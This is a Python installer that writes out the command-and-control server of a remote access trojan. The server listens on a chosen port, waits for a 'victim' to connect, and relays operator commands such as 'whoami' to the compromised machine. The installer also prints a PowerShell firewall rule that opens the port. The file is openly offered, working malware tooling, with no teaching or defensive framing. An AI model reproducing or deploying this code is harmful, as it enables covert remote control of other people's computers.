import os
import sys
import subprocess
import shutil
import platform

# Template for the server code. Note the placeholder {SERVER_PORT_PLACEHOLDER}.
SERVER_CODE_TEMPLATE = """import socket
import sys
import os

LISTEN_IP = '0.0.0.0'  # Listen on all interfaces
PORT = {SERVER_PORT_PLACEHOLDER}  # Port inserted by installer

def main():
    print(f"--- RAT Server Started (Port {PORT}) ---")
    print("Waiting for victim to connect...")
    print("NOTE: This server handles silent commands correctly and will always re-prompt.")
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((LISTEN_IP, PORT))
        server.listen(1)
        print(f"[*] Listening on {LISTEN_IP}:{PORT}")
    except Exception as e:
        print(f"[!] Failed to bind: {e}")
        print("[!] Ensure no other program is using this port and check firewall settings.")
        sys.exit(1)

    print("[*] Waiting for connection...")
    client, addr = server.accept()
    print(f"[+] Connection received from {addr}")
    print("[*] You are now connected. Try typing 'whoami' or 'dir'.")
    print("[*] Type 'exit' to quit.")

    while True:
        try:
            cmd = input("\\n# Command: ")
            
            if cmd.lower() == 'exit':
                print("[*] Sending exit command...")
                client.send('exit'.encode())
                break
            
            print(f"[*] Sending command: {cmd}")
            client.send(cmd.encode())
            
            data = client.recv(4096)
            
            if not data:
                print("[!] Connection closed by remote host (No data received).")
                break
            
            response = data.decode()
            if response:
                print("[Response from client]:")
                print(response)
            else:
                print("[!] Received empty response. Something is wrong.")
                
        except KeyboardInterrupt:
            print("\\n[*] Interrupted by user. Closing connection.")
            break
        except Exception as e:
            print(f"[!] Error occurred: {e}")
            print("[*] Connection likely lost. Exiting.")
            break

    try:
        client.close()
        server.close()
    except:
        pass
    print("[*] Server shut down.")

if __name__ == "__main__":
    main()
"""

def main():
    print("[*] RAT Server Installer (Interactive Port Configuration)")
    print("[*] Checking for Python...")
    
    if not shutil.which("python3") and not shutil.which("python"):
        print("[-] Error: Python is not installed or not in PATH.")
        sys.exit(1)
        
    python_cmd = "python3" if shutil.which("python3") else "python"
    
    # --- INTERACTIVE PORT INPUT ---
    print("\nDefault port is 9999. Press Enter to use default.")
    while True:
        port_input = input("Enter Port Number (1024-65535): ").strip()
        
        if not port_input:
            port = 9999
            print(f"[+] Using default port: {port}")
            break
            
        try:
            port = int(port_input)
            if 1024 <= port <= 65535:
                print(f"[+] Valid port entered: {port}")
                break
            else:
                print("[!] Port must be between 1024 and 65535. Please try again.")
        except ValueError:
            print("[!] Invalid input. Please enter a number.")
    
    # Inject the port into the code template
    final_server_code = SERVER_CODE_TEMPLATE.replace("{SERVER_PORT_PLACEHOLDER}", str(port))
    
    script_name = "control_panel.py"
    script_path = os.path.join(os.getcwd(), script_name)
    
    print(f"\n[*] Creating {script_name} on Port {port}...")
    with open(script_path, "w") as f:
        f.write(final_server_code)
        
    print(f"[+] Created {script_path}")
    print(f"\n[!] To run the server: {python_cmd} {script_path}")
    print(f"[!] Ensure your firewall allows incoming connections on port {port}.")
    
    if platform.system() == "Windows":
        print(f"\n[!] Windows Users: You may need to create a firewall exception manually.")
        print(f"    Run this in PowerShell as Administrator to allow Python on port {port}:")
        # Note: This is a generic warning; specific port rules require more complex PowerShell commands
        print(f"    New-NetFirewallRule -DisplayName \"AllowPythonPort{port}\" -Direction Inbound -Action Allow -Program \"{shutil.which(python_cmd).strip()}\" -LocalPort {port} -Protocol TCP")

if __name__ == "__main__":
    main()
